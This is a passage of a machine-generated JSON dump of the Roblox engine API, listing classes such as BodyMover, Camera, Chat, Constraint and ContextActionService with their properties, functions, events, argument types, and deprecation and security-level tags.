Security"],"Class":"StarterGui","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"BinaryStringValue","tags":[]},{"Superclass":"Instance","type":"Class","Name":"BindableEvent","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"Tuple","Name":"arguments","Default":null}],"Name":"Fire","tags":[],"Class":"BindableEvent","type":"Function"},{"Arguments":[{"Name":"arguments","Type":"Tuple"}],"Name":"Event","tags":[],"Class":"BindableEvent","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"BindableFunction","tags":[]},{"ReturnType":"Tuple","Arguments":[{"Type":"Tuple","Name":"arguments","Default":null}],"Name":"Invoke","tags":[],"Class":"BindableFunction","type":"YieldFunction"},{"ReturnType":"Tuple","Arguments":[{"Name":"arguments","Type":"Tuple"}],"Name":"OnInvoke","tags":[],"Class":"BindableFunction","type":"Callback"},{"Superclass":"Instance","type":"Class","Name":"BodyMover","tags":[]},{"Superclass":"BodyMover","type":"Class","Name":"BodyAngularVelocity","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"AngularVelocity","tags":[],"Class":"BodyAngularVelocity"},{"ValueType":"Vector3","type":"Property","Name":"MaxTorque","tags":[],"Class":"BodyAngularVelocity"},{"ValueType":"float","type":"Property","Name":"P","tags":[],"Class":"BodyAngularVelocity"},{"ValueType":"Vector3","type":"Property","Name":"angularvelocity","tags":["deprecated"],"Class":"BodyAngularVelocity"},{"ValueType":"Vector3","type":"Property","Name":"maxTorque","tags":["deprecated"],"Class":"BodyAngularVelocity"},{"Superclass":"BodyMover","type":"Class","Name":"BodyForce","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"Force","tags":[],"Class":"BodyForce"},{"ValueType":"Vector3","type":"Property","Name":"force","tags":["deprecated"],"Class":"BodyForce"},{"Superclass":"BodyMover","type":"Class","Name":"BodyGyro","tags":[]},{"ValueType":"CoordinateFrame","type":"Property","Name":"CFrame","tags":[],"Class":"BodyGyro"},{"ValueType":"float","type":"Property","Name":"D","tags":[],"Class":"BodyGyro"},{"ValueType":"Vector3","type":"Property","Name":"MaxTorque","tags":[],"Class":"BodyGyro"},{"ValueType":"float","type":"Property","Name":"P","tags":[],"Class":"BodyGyro"},{"ValueType":"CoordinateFrame","type":"Property","Name":"cframe","tags":["deprecated"],"Class":"BodyGyro"},{"ValueType":"Vector3","type":"Property","Name":"maxTorque","tags":["deprecated"],"Class":"BodyGyro"},{"Superclass":"BodyMover","type":"Class","Name":"BodyPosition","tags":[]},{"ValueType":"float","type":"Property","Name":"D","tags":[],"Class":"BodyPosition"},{"ValueType":"Vector3","type":"Property","Name":"MaxForce","tags":[],"Class":"BodyPosition"},{"ValueType":"float","type":"Property","Name":"P","tags":[],"Class":"BodyPosition"},{"ValueType":"Vector3","type":"Property","Name":"Position","tags":[],"Class":"BodyPosition"},{"ValueType":"Vector3","type":"Property","Name":"maxForce","tags":["deprecated"],"Class":"BodyPosition"},{"ValueType":"Vector3","type":"Property","Name":"position","tags":["deprecated"],"Class":"BodyPosition"},{"ReturnType":"Vector3","Arguments":[],"Name":"GetLastForce","tags":[],"Class":"BodyPosition","type":"Function"},{"ReturnType":"Vector3","Arguments":[],"Name":"lastForce","tags":["deprecated"],"Class":"BodyPosition","type":"Function"},{"Arguments":[],"Name":"ReachedTarget","tags":[],"Class":"BodyPosition","type":"Event"},{"Superclass":"BodyMover","type":"Class","Name":"BodyThrust","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"Force","tags":[],"Class":"BodyThrust"},{"ValueType":"Vector3","type":"Property","Name":"Location","tags":[],"Class":"BodyThrust"},{"ValueType":"Vector3","type":"Property","Name":"force","tags":["deprecated"],"Class":"BodyThrust"},{"ValueType":"Vector3","type":"Property","Name":"location","tags":["deprecated"],"Class":"BodyThrust"},{"Superclass":"BodyMover","type":"Class","Name":"BodyVelocity","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"MaxForce","tags":[],"Class":"BodyVelocity"},{"ValueType":"float","type":"Property","Name":"P","tags":[],"Class":"BodyVelocity"},{"ValueType":"Vector3","type":"Property","Name":"Velocity","tags":[],"Class":"BodyVelocity"},{"ValueType":"Vector3","type":"Property","Name":"maxForce","tags":["deprecated"],"Class":"BodyVelocity"},{"ValueType":"Vector3","type":"Property","Name":"velocity","tags":["deprecated"],"Class":"BodyVelocity"},{"ReturnType":"Vector3","Arguments":[],"Name":"GetLastForce","tags":[],"Class":"BodyVelocity","type":"Function"},{"ReturnType":"Vector3","Arguments":[],"Name":"lastForce","tags":[],"Class":"BodyVelocity","type":"Function"},{"Superclass":"BodyMover","type":"Class","Name":"RocketPropulsion","tags":[]},{"ValueType":"float","type":"Property","Name":"CartoonFactor","tags":[],"Class":"RocketPropulsion"},{"ValueType":"float","type":"Property","Name":"MaxSpeed","tags":[],"Class":"RocketPropulsion"},{"ValueType":"float","type":"Property","Name":"MaxThrust","tags":[],"Class":"RocketPropulsion"},{"ValueType":"Vector3","type":"Property","Name":"MaxTorque","tags":[],"Class":"RocketPropulsion"},{"ValueType":"Object","type":"Property","Name":"Target","tags":[],"Class":"RocketPropulsion"},{"ValueType":"Vector3","type":"Property","Name":"TargetOffset","tags":[],"Class":"RocketPropulsion"},{"ValueType":"float","type":"Property","Name":"TargetRadius","tags":[],"Class":"RocketPropulsion"},{"ValueType":"float","type":"Property","Name":"ThrustD","tags":[],"Class":"RocketPropulsion"},{"ValueType":"float","type":"Property","Name":"ThrustP","tags":[],"Class":"RocketPropulsion"},{"ValueType":"float","type":"Property","Name":"TurnD","tags":[],"Class":"RocketPropulsion"},{"ValueType":"float","type":"Property","Name":"TurnP","tags":[],"Class":"RocketPropulsion"},{"ReturnType":"void","Arguments":[],"Name":"Abort","tags":[],"Class":"RocketPropulsion","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Fire","tags":[],"Class":"RocketPropulsion","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"fire","tags":["deprecated"],"Class":"RocketPropulsion","type":"Function"},{"Arguments":[],"Name":"ReachedTarget","tags":[],"Class":"RocketPropulsion","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"BoolValue","tags":[]},{"ValueType":"bool","type":"Property","Name":"Value","tags":[],"Class":"BoolValue"},{"Arguments":[{"Name":"value","Type":"bool"}],"Name":"Changed","tags":[],"Class":"BoolValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"bool"}],"Name":"changed","tags":["deprecated"],"Class":"BoolValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"BrickColorValue","tags":[]},{"ValueType":"BrickColor","type":"Property","Name":"Value","tags":[],"Class":"BrickColorValue"},{"Arguments":[{"Name":"value","Type":"BrickColor"}],"Name":"Changed","tags":[],"Class":"BrickColorValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"BrickColor"}],"Name":"changed","tags":["deprecated"],"Class":"BrickColorValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"Button","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"active","Default":null}],"Name":"SetActive","tags":["PluginSecurity"],"Class":"Button","type":"Function"},{"Arguments":[],"Name":"Click","tags":["PluginSecurity"],"Class":"Button","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"CFrameValue","tags":[]},{"ValueType":"CoordinateFrame","type":"Property","Name":"Value","tags":[],"Class":"CFrameValue"},{"Arguments":[{"Name":"value","Type":"CoordinateFrame"}],"Name":"Changed","tags":[],"Class":"CFrameValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"CoordinateFrame"}],"Name":"changed","tags":["deprecated"],"Class":"CFrameValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"CacheableContentProvider","tags":[]},{"Superclass":"CacheableContentProvider","type":"Class","Name":"MeshContentProvider","tags":[]},{"Superclass":"CacheableContentProvider","type":"Class","Name":"SolidModelContentProvider","tags":[]},{"Superclass":"CacheableContentProvider","type":"Class","Name":"TextureContentProvider","tags":[]},{"Superclass":"Instance","type":"Class","Name":"Camera","tags":[]},{"ValueType":"CoordinateFrame","type":"Property","Name":"CFrame","tags":[],"Class":"Camera"},{"ValueType":"Object","type":"Property","Name":"CameraSubject","tags":[],"Class":"Camera"},{"ValueType":"CameraType","type":"Property","Name":"CameraType","tags":[],"Class":"Camera"},{"ValueType":"CoordinateFrame","type":"Property","Name":"CoordinateFrame","tags":["deprecated","hidden"],"Class":"Camera"},{"ValueType":"float","type":"Property","Name":"FieldOfView","tags":[],"Class":"Camera"},{"ValueType":"CoordinateFrame","type":"Property","Name":"Focus","tags":[],"Class":"Camera"},{"ValueType":"bool","type":"Property","Name":"HeadLocked","tags":[],"Class":"Camera"},{"ValueType":"float","type":"Property","Name":"HeadScale","tags":[],"Class":"Camera"},{"ValueType":"Vector2","type":"Property","Name":"ViewportSize","tags":["readonly"],"Class":"Camera"},{"ValueType":"CoordinateFrame","type":"Property","Name":"focus","tags":["deprecated"],"Class":"Camera"},{"ReturnType":"float","Arguments":[],"Name":"GetPanSpeed","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"CoordinateFrame","Arguments":[],"Name":"GetRenderCFrame","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"float","Arguments":[],"Name":"GetRoll","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"float","Arguments":[],"Name":"GetTiltSpeed","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"CoordinateFrame","Name":"endPos","Default":null},{"Type":"CoordinateFrame","Name":"endFocus","Default":null},{"Type":"float","Name":"duration","Default":null}],"Name":"Interpolate","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"units","Default":null}],"Name":"PanUnits","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"Ray","Arguments":[{"Type":"float","Name":"x","Default":null},{"Type":"float","Name":"y","Default":null},{"Type":"float","Name":"depth","Default":"0"}],"Name":"ScreenPointToRay","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"CameraPanMode","Name":"mode","Default":"Classic"}],"Name":"SetCameraPanMode","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"rollAngle","Default":null}],"Name":"SetRoll","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"units","Default":null}],"Name":"TiltUnits","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"Ray","Arguments":[{"Type":"float","Name":"x","Default":null},{"Type":"float","Name":"y","Default":null},{"Type":"float","Name":"depth","Default":"0"}],"Name":"ViewportPointToRay","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"Vector3","Name":"worldPoint","Default":null}],"Name":"WorldToScreenPoint","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"Vector3","Name":"worldPoint","Default":null}],"Name":"WorldToViewportPoint","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"float","Name":"distance","Default":null}],"Name":"Zoom","tags":["RobloxScriptSecurity"],"Class":"Camera","type":"Function"},{"Arguments":[{"Name":"entering","Type":"bool"}],"Name":"FirstPersonTransition","tags":["RobloxPlaceSecurity"],"Class":"Camera","type":"Event"},{"Arguments":[],"Name":"InterpolationFinished","tags":[],"Class":"Camera","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"ChangeHistoryService","tags":["notCreatable"]},{"ReturnType":"Tuple","Arguments":[],"Name":"GetCanRedo","tags":["PluginSecurity"],"Class":"ChangeHistoryService","type":"Function"},{"ReturnType":"Tuple","Arguments":[],"Name":"GetCanUndo","tags":["PluginSecurity"],"Class":"ChangeHistoryService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Redo","tags":["PluginSecurity"],"Class":"ChangeHistoryService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ResetWaypoints","tags":["PluginSecurity"],"Class":"ChangeHistoryService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"state","Default":null}],"Name":"SetEnabled","tags":["PluginSecurity"],"Class":"ChangeHistoryService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"name","Default":null}],"Name":"SetWaypoint","tags":["PluginSecurity"],"Class":"ChangeHistoryService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Undo","tags":["PluginSecurity"],"Class":"ChangeHistoryService","type":"Function"},{"Arguments":[{"Name":"waypoint","Type":"string"}],"Name":"OnRedo","tags":["PluginSecurity"],"Class":"ChangeHistoryService","type":"Event"},{"Arguments":[{"Name":"waypoint","Type":"string"}],"Name":"OnUndo","tags":["PluginSecurity"],"Class":"ChangeHistoryService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"CharacterAppearance","tags":[]},{"Superclass":"CharacterAppearance","type":"Class","Name":"BodyColors","tags":[]},{"ValueType":"BrickColor","type":"Property","Name":"HeadColor","tags":[],"Class":"BodyColors"},{"ValueType":"BrickColor","type":"Property","Name":"LeftArmColor","tags":[],"Class":"BodyColors"},{"ValueType":"BrickColor","type":"Property","Name":"LeftLegColor","tags":[],"Class":"BodyColors"},{"ValueType":"BrickColor","type":"Property","Name":"RightArmColor","tags":[],"Class":"BodyColors"},{"ValueType":"BrickColor","type":"Property","Name":"RightLegColor","tags":[],"Class":"BodyColors"},{"ValueType":"BrickColor","type":"Property","Name":"TorsoColor","tags":[],"Class":"BodyColors"},{"Superclass":"CharacterAppearance","type":"Class","Name":"CharacterMesh","tags":[]},{"ValueType":"int","type":"Property","Name":"BaseTextureId","tags":[],"Class":"CharacterMesh"},{"ValueType":"BodyPart","type":"Property","Name":"BodyPart","tags":[],"Class":"CharacterMesh"},{"ValueType":"int","type":"Property","Name":"MeshId","tags":[],"Class":"CharacterMesh"},{"ValueType":"int","type":"Property","Name":"OverlayTextureId","tags":[],"Class":"CharacterMesh"},{"Superclass":"CharacterAppearance","type":"Class","Name":"Clothing","tags":[]},{"Superclass":"Clothing","type":"Class","Name":"Pants","tags":[]},{"ValueType":"Content","type":"Property","Name":"PantsTemplate","tags":[],"Class":"Pants"},{"Superclass":"Clothing","type":"Class","Name":"Shirt","tags":[]},{"ValueType":"Content","type":"Property","Name":"ShirtTemplate","tags":[],"Class":"Shirt"},{"Superclass":"CharacterAppearance","type":"Class","Name":"ShirtGraphic","tags":[]},{"ValueType":"Content","type":"Property","Name":"Graphic","tags":[],"Class":"ShirtGraphic"},{"Superclass":"CharacterAppearance","type":"Class","Name":"Skin","tags":["deprecated"]},{"ValueType":"BrickColor","type":"Property","Name":"SkinColor","tags":[],"Class":"Skin"},{"Superclass":"Instance","type":"Class","Name":"Chat","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"partOrCharacter","Default":null},{"Type":"string","Name":"message","Default":null},{"Type":"ChatColor","Name":"color","Default":"Blue"}],"Name":"Chat","tags":[],"Class":"Chat","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"stringToFilter","Default":null},{"Type":"Instance","Name":"playerFrom","Default":null},{"Type":"Instance","Name":"playerTo","Default":null}],"Name":"FilterStringAsync","tags":[],"Class":"Chat","type":"YieldFunction"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"stringToFilter","Default":null},{"Type":"Instance","Name":"playerToFilterFor","Default":null}],"Name":"FilterStringForPlayerAsync","tags":[],"Class":"Chat","type":"YieldFunction"},{"Arguments":[{"Name":"part","Type":"Instance"},{"Name":"message","Type":"string"},{"Name":"color","Type":"ChatColor"}],"Name":"Chatted","tags":[],"Class":"Chat","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"ChatFilter","tags":["notCreatable"]},{"Superclass":"Instance","type":"Class","Name":"ClickDetector","tags":[]},{"ValueType":"float","type":"Property","Name":"MaxActivationDistance","tags":[],"Class":"ClickDetector"},{"Arguments":[{"Name":"playerWhoClicked","Type":"Instance"}],"Name":"MouseClick","tags":[],"Class":"ClickDetector","type":"Event"},{"Arguments":[{"Name":"playerWhoHovered","Type":"Instance"}],"Name":"MouseHoverEnter","tags":[],"Class":"ClickDetector","type":"Event"},{"Arguments":[{"Name":"playerWhoHovered","Type":"Instance"}],"Name":"MouseHoverLeave","tags":[],"Class":"ClickDetector","type":"Event"},{"Arguments":[{"Name":"playerWhoClicked","Type":"Instance"}],"Name":"mouseClick","tags":["deprecated"],"Class":"ClickDetector","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"ClusterPacketCache","tags":[]},{"Superclass":"Instance","type":"Class","Name":"CollectionService","tags":[]},{"ReturnType":"Objects","Arguments":[{"Type":"string","Name":"class","Default":null}],"Name":"GetCollection","tags":[],"Class":"CollectionService","type":"Function"},{"Arguments":[{"Name":"instance","Type":"Instance"}],"Name":"ItemAdded","tags":[],"Class":"CollectionService","type":"Event"},{"Arguments":[{"Name":"instance","Type":"Instance"}],"Name":"ItemRemoved","tags":[],"Class":"CollectionService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"Color3Value","tags":[]},{"ValueType":"Color3","type":"Property","Name":"Value","tags":[],"Class":"Color3Value"},{"Arguments":[{"Name":"value","Type":"Color3"}],"Name":"Changed","tags":[],"Class":"Color3Value","type":"Event"},{"Arguments":[{"Name":"value","Type":"Color3"}],"Name":"changed","tags":["deprecated"],"Class":"Color3Value","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"Configuration","tags":[]},{"Superclass":"Instance","type":"Class","Name":"Constraint","tags":[]},{"ValueType":"Object","type":"Property","Name":"Attachment0","tags":[],"Class":"Constraint"},{"ValueType":"Object","type":"Property","Name":"Attachment1","tags":[],"Class":"Constraint"},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"Constraint"},{"Superclass":"Constraint","type":"Class","Name":"BallSocketConstraint","tags":[]},{"ValueType":"bool","type":"Property","Name":"LimitsEnabled","tags":[],"Class":"BallSocketConstraint"},{"ValueType":"float","type":"Property","Name":"Restitution","tags":[],"Class":"BallSocketConstraint"},{"ValueType":"float","type":"Property","Name":"UpperAngle","tags":[],"Class":"BallSocketConstraint"},{"Superclass":"Constraint","type":"Class","Name":"HingeConstraint","tags":[]},{"ValueType":"ActuatorType","type":"Property","Name":"ActuatorType","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"AngularSpeed","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"AngularVelocity","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"CurrentAngle","tags":["readonly"],"Class":"HingeConstraint"},{"ValueType":"bool","type":"Property","Name":"LimitsEnabled","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"LowerAngle","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"MotorMaxAcceleration","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"MotorMaxTorque","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"Restitution","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"ServoMaxTorque","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"TargetAngle","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"UpperAngle","tags":[],"Class":"HingeConstraint"},{"Superclass":"Constraint","type":"Class","Name":"MoveToConstraint","tags":[]},{"ValueType":"float","type":"Property","Name":"MaxForce","tags":[],"Class":"MoveToConstraint"},{"ValueType":"float","type":"Property","Name":"StabilizingDistance","tags":[],"Class":"MoveToConstraint"},{"ValueType":"float","type":"Property","Name":"Velocity","tags":[],"Class":"MoveToConstraint"},{"Superclass":"Constraint","type":"Class","Name":"RodConstraint","tags":[]},{"ValueType":"float","type":"Property","Name":"CurrentDistance","tags":["readonly"],"Class":"RodConstraint"},{"ValueType":"float","type":"Property","Name":"Length","tags":[],"Class":"RodConstraint"},{"Superclass":"Constraint","type":"Class","Name":"RopeConstraint","tags":[]},{"ValueType":"float","type":"Property","Name":"CurrentLength","tags":["readonly"],"Class":"RopeConstraint"},{"ValueType":"float","type":"Property","Name":"Length","tags":[],"Class":"RopeConstraint"},{"ValueType":"float","type":"Property","Name":"Restitution","tags":[],"Class":"RopeConstraint"},{"Superclass":"Constraint","type":"Class","Name":"SlidingBallConstraint","tags":[]},{"ValueType":"ActuatorType","type":"Property","Name":"ActuatorType","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"CurrentPosition","tags":["readonly"],"Class":"SlidingBallConstraint"},{"ValueType":"bool","type":"Property","Name":"LimitsEnabled","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"LowerLimit","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"MotorMaxAcceleration","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"MotorMaxForce","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"Restitution","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"ServoMaxForce","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"Speed","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"TargetPosition","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"UpperLimit","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"Velocity","tags":[],"Class":"SlidingBallConstraint"},{"Superclass":"SlidingBallConstraint","type":"Class","Name":"CylindricalConstraint","tags":[]},{"ValueType":"float","type":"Property","Name":"AzimuthalAngle","tags":[],"Class":"CylindricalConstraint"},{"ValueType":"float","type":"Property","Name":"InclinationAngle","tags":[],"Class":"CylindricalConstraint"},{"Superclass":"SlidingBallConstraint","type":"Class","Name":"PrismaticConstraint","tags":[]},{"Superclass":"Constraint","type":"Class","Name":"SpringConstraint","tags":[]},{"ValueType":"float","type":"Property","Name":"CurrentLength","tags":["readonly"],"Class":"SpringConstraint"},{"ValueType":"float","type":"Property","Name":"Damping","tags":[],"Class":"SpringConstraint"},{"ValueType":"float","type":"Property","Name":"FreeLength","tags":[],"Class":"SpringConstraint"},{"ValueType":"bool","type":"Property","Name":"LimitsEnabled","tags":[],"Class":"SpringConstraint"},{"ValueType":"float","type":"Property","Name":"MaxForce","tags":[],"Class":"SpringConstraint"},{"ValueType":"float","type":"Property","Name":"MaxLength","tags":[],"Class":"SpringConstraint"},{"ValueType":"float","type":"Property","Name":"MinLength","tags":[],"Class":"SpringConstraint"},{"ValueType":"float","type":"Property","Name":"Stiffness","tags":[],"Class":"SpringConstraint"},{"Superclass":"Instance","type":"Class","Name":"ContentFilter","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"outstandingRequests","Default":null},{"Type":"int","Name":"cacheSize","Default":null}],"Name":"SetFilterLimits","tags":["LocalUserSecurity"],"Class":"ContentFilter","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetFilterUrl","tags":["LocalUserSecurity"],"Class":"ContentFilter","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"ContentProvider","tags":[]},{"ValueType":"string","type":"Property","Name":"BaseUrl","tags":["readonly"],"Class":"ContentProvider"},{"ValueType":"int","type":"Property","Name":"RequestQueueSize","tags":["readonly"],"Class":"ContentProvider"},{"ReturnType":"void","Arguments":[{"Type":"Content","Name":"contentId","Default":null}],"Name":"Preload","tags":[],"Class":"ContentProvider","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetAssetUrl","tags":["LocalUserSecurity"],"Class":"ContentProvider","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetBaseUrl","tags":["LocalUserSecurity"],"Class":"ContentProvider","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"count","Default":null}],"Name":"SetCacheSize","tags":["LocalUserSecurity"],"Class":"ContentProvider","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"count","Default":null}],"Name":"SetThreadPool","tags":["LocalUserSecurity"],"Class":"ContentProvider","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Array","Name":"contentIdList","Default":null}],"Name":"PreloadAsync","tags":[],"Class":"ContentProvider","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"ContextActionService","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null},{"Type":"Function","Name":"functionToBind","Default":null},{"Type":"bool","Name":"createTouchButton","Default":null},{"Type":"Tuple","Name":"inputTypes","Default":null}],"Name":"BindAction","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null},{"Type":"Function","Name":"functionToBind","Default":null},{"Type":"bool","Name":"createTouchButton","Default":null},{"Type":"Tuple","Name":"inputTypes","Default":null}],"Name":"BindActionToInputTypes","tags":["deprecated"],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"UserInputType","Name":"userInputTypeForActivation","Default":null},{"Type":"KeyCode","Name":"keyCodeForActivation","Default":"Unknown"}],"Name":"BindActivate","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null},{"Type":"Function","Name":"functionToBind","Default":null},{"Type":"bool","Name":"createTouchButton","Default":null},{"Type":"Tuple","Name":"inputTypes","Default":null}],"Name":"BindCoreAction","tags":["RobloxScriptSecurity"],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null},{"Type":"UserInputState","Name":"state","Default":null},{"Type":"Instance","Name":"inputObject","Default":null}],"Name":"CallFunction","tags":["RobloxScriptSecurity"],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null},{"Type":"Instance","Name":"actionButton","Default":null}],"Name":"FireActionButtonFoundSignal","tags":["RobloxScriptSecurity"],"Class":"ContextActionService","type":"Function"},{"ReturnType":"Dictionary","Arguments":[],"Name":"GetAllBoundActionInfo","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"Dictionary","Arguments":[{"Type":"string","Name":"actionName","Default":null}],"Name":"GetBoundActionInfo","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"string","Arguments":[],"Name":"GetCurrentLocalToolIcon","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null},{"Type":"string","Name":"description","Default":null}],"Name":"SetDescription","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null},{"Type":"string","Name":"image","Default":null}],"Name":"SetImage","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null},{"Type":"UDim2","Name":"position","Default":null}],"Name":"SetPosition","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null},{"Type":"string","Name":"title","Default":null}],"Name":"SetTitle","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null}],"Name":"UnbindAction","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"UserInputType","Name":"userInputTypeForActivation","Default":null},{"Type":"KeyCode","Name":"keyCodeForActivation","Default":"Unknown"}],"Name":"UnbindActivate","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"UnbindAllActions","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null}],"Name":"UnbindCoreAction","tags":["RobloxScriptSecurity"],"Class":"ContextActionService","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"actionName","Default":null}],"Name":"GetButton","tags":[],"Class":"ContextActionService","type":"YieldFunction"},{"Arguments":[{"Name":"actionAdded","Type":"string"},{"Name":"createTouchButton","Type":"bool"},{"Name":"functionInfoTable","Type":"Dictionary"}],"Name":"BoundActionAdded","tags":["RobloxScriptSecurity"],"Class":"ContextActionService","type":"Event"},{"Arguments":[{"Name":"actionChanged","Type":"string"},{"Name":"changeName","Type":"string"},{"Name":"changeTable","Type":"Dictionary"}],"Name":"BoundActionChanged","tags":["RobloxScriptSecurity"],"Class":"ContextActionService","type":"Event"},{"Arguments":[{"Name":"actionRemoved","Type":"string"},{"Name":"functionInfoTable","Type":"Dictionary"}],"Name":"BoundActionRemoved","tags":["RobloxScriptSecurity"],"Class":"ContextActionService","type":"Event"},{"Arguments":[{"Name":"actionName","Type":"string"}],"Name":"GetActionButtonEvent","tags":["RobloxScriptSecurity"],"Class":"ContextActionService","type":"Event"},{"Arguments":[{"Name":"toolEquipped","Type":"Instance"}],"Name":"LocalToolEquipped","tags":[],"Class":"ContextActionService","type":"Event"},{"Arguments":[{"Name":"toolUnequipped","Type":"Instance"}],"Name":"LocalToolUnequipped","tags":[],"Class":"ContextActionService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"Controller","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"Button","Name":"button","Default":null},{"Type":"string","Name":"caption","Default":null}],"Name":"BindButton","tags":[],"Class":"Controller","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Button","Name":"button","Default":null}],"Name":"GetButton","tags":[],"Class":"Controller","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Button","Name":"button","Def